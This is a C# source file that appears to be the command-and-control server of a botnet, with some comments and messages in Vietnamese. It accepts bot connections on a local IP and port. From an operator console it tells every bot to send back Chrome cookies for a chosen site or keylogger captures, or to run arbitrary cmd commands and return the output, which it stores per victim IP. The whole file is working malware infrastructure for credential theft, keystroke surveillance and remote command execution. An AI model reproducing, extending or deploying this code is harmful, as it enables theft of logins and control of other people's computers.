using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting.Channels;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using System.Collections;
using System.Runtime.CompilerServices;

namespace Control
{
     class Program
    {

        static Dictionary<TcpClient, string> clients = new Dictionary<TcpClient, string>();

        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
     

        static ASCIIEncoding encoding = new ASCIIEncoding();
        static List<Task> tasks = new List<Task>();
        static Boolean isFinished = true;

        static void Main(string[] args)
        {
            try
            {
                IPAddress address = IPAddress.Parse("192.168.1.101");

                TcpListener listener = new TcpListener(address, PORT_NUMBER);

                listener.Start();

                Console.WriteLine("Server started on " + listener.LocalEndpoint);
                Console.WriteLine("Waiting for a connection...");

                Thread th_server_listener = new Thread(() => handleConnectSocket(listener));
                th_server_listener.Start();

                Thread th_server_handleCommand = new Thread(() => handleControlBot(listener));
                th_server_handleCommand.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
        }
        public static void handleConnectSocket(TcpListener listener)
        {
            while (true)
            {
                TcpClient tcplient = listener.AcceptTcpClient();
                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).Address.ToString();
                clients.Add(tcplient, clientName);
            }
        }
        public static  void handleControlBot(TcpListener listener)
        {
            while (true)
            {
                if(clients.Count > 0 && isFinished == true)
                {
                    Console.WriteLine(" Command & Control Center");
                    Console.Write("Enter your command: ");
                    string command = Console.ReadLine();
                    handleCommand(command);
                }
                
            }
        }

        public static void receiveFileSocket(TcpClient client,string type)
        {
            string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];

            string fileName ="";
            if (type =="cookies")
            {
                fileName =ip+  "_cookies.txt";
            }  
            else if( type =="keylogger")
            {
                fileName = ip+ "_keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName =ip+  "_cmdResult.txt";
            }

            NetworkStream stream = client.GetStream();

                byte[] fileSizeBytes = new byte[4];
                int bytes = stream.Read(fileSizeBytes, 0, 4);
                int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);

                int bytesLeft = dataLength;
                byte[] data = new byte[dataLength];

                int bufferSize = 1024;
                int bytesRead = 0;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);
                if (client.Available < curDataSize)
                    curDataSize = client.Available; //This saved me

                bytes = stream.Read(data, bytesRead, curDataSize);

                bytesRead += curDataSize;
                bytesLeft -= curDataSize;

            }
                FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate);
                fs.Write(data, 0, dataLength);
                fs.Close();
         }    
        public static async void handleCommand(string command)
        {
            //Socket socket = client.Client;
            command = command.Trim().ToLower();
            if(command == "clear")
            {
                Console.Clear();
            } 
            else if(command == "exit")
            {

                //sendMessageSocket("exit", socket);
                //Console.WriteLine("Sending exit command...");
                //string messageReceive = receiveMessageSocket(socket);
                //Console.WriteLine("Client: " + messageReceive);
            }
            else if(command== "get cookies")
            {
                Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
                string url = Console.ReadLine();
                string ms = "cookies?" + url + "?";
                List<Task> cookies = new List<Task>();
                foreach (var cli in clients.Keys)
                {
                    isFinished = false;
                    cookies.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                            Console.WriteLine("Sending request get cookies to "+ip +"...");
                            receiveFileSocket(cli, "cookies");
                            Console.WriteLine("Receive cookies from " + ip+" complete!");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }
                await Task.WhenAll(cookies);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file cookies tu botnet.");
            }
            else if (command == "get keylogger")
            {


                //foreach (var cli in clients.Keys)
                //{
                //    //Thread th_cli = new Thread(() => {

                //    //    clients.TryGetValue(cli, out string ip);
                //    //    sendMessageSocket("keylogger", cli.Client);
                //    //    Console.WriteLine("Sending request get keylogger to "+ ip+"...");
                //    //    receiveFileSocket(cli, "keylogger");
                //    //    Console.WriteLine("Receive keylogger from "+ip+"!");
                //    //});
                //    //th_cli.Start();

                //    //<-------------------->
                //    Task task = Task.Run(async () =>
                //    {
                //        try
                //        {
                //            clients.TryGetValue(cli, out string ip);
                //            sendMessageSocket("keylogger", cli.Client);
                //            Console.WriteLine("Sending request get keylogger to " + ip + "...");
                //            receiveFileSocket(cli, "keylogger");
                //            Console.WriteLine("Receive keylogger from " + ip + "!");
                //        }
                //        catch (Exception ex)
                //        {
                //            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                //        }
                //    });

                //    tasks.Add(task);
                //}
                //await Task.WhenAll(tasks);
                //Console.WriteLine("Xong hết tất cả tasks" );

                List<Task> keyloggerTasks = new List<Task>();

                foreach (var cli in clients.Keys)
                {
                    isFinished = false;
                    keyloggerTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket("keylogger", cli.Client);
                            Console.WriteLine("Sending request get keylogger to " + ip + "...");
                            receiveFileSocket(cli, "keylogger");
                            Console.WriteLine("Receive keylogger from " + ip + "!");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }

                await Task.WhenAll(keyloggerTasks); 
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file keylogger tu botnet.");
            }
            else if (command == "run cmd command")
            {
                string cmd = "";
                Console.Write("Enter command:");
                cmd = Console.ReadLine();
                string ms = "run cmd command " + cmd;

                List<Task> cmdTasks = new List<Task>();

                foreach (var cli in clients.Keys)
                {
                    isFinished = false;
                    cmdTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                            Console.WriteLine("Sending request get cmd to " + ip + "...");
                            receiveFileSocket(cli, "cmd");
                            Console.WriteLine("Receive file cmd from " + ip + "!");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }

                await Task.WhenAll(cmdTasks);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file cmd tu botnet.");


                //sendMessageSocket(ms,socket);
                //Console.WriteLine("Sending request run cmd command...");
                //receiveFileSocket(client, "cmd");
                //Console.WriteLine("Receive rs command complete!");
            }
            else if (command == "read keylogger")
            {
                string type = "keylogger";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if (command == "read cookies")
            {
                string type = "cookies";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if (command == "read cmd command")
            {
                string type = "cmd";
                string rs = readFile(type);
                Console.Write(rs);

            }
            else if(command == "help")
            {
                Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
                Console.WriteLine("get keylogger                       --> Get File From Bot");
                Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
                Console.WriteLine("read keylogger                      --> Read Keylogger File From Bot");
                Console.WriteLine("read cookies                        --> Read Cookies File From Bot");
                Console.WriteLine("read cmd command                    --> Read CMD Command File From Bot");
                Console.WriteLine("clear                               --> Clear The Screen");
                Console.WriteLine("exit                                --> Exit Socket");
            }
               
        }
      
            
        
        public static void sendMessageSocket(string message,Socket socket)
        {
            socket.Send(encoding.GetBytes(message));
        }
        public static string receiveMessageSocket(Socket socket)
        {
            byte[] data = new byte[BUFFER_SIZE];
            socket.Receive(data);
            string rs = encoding.GetString(data);
            return rs;
        }


        public static string readFile(string type)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "cookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }

            string rs = "";

            if(File.Exists(fileName))
            {
                string[] lines = File.ReadAllLines(fileName);

                foreach (string line in lines)
                {
                    rs += line + "\n";
                }
            }
            else
            {
                rs = "The file " + fileName + " does not exist\n You need get "+fileName + " from botnet\n";
            }

            return rs;
        }
    }
}
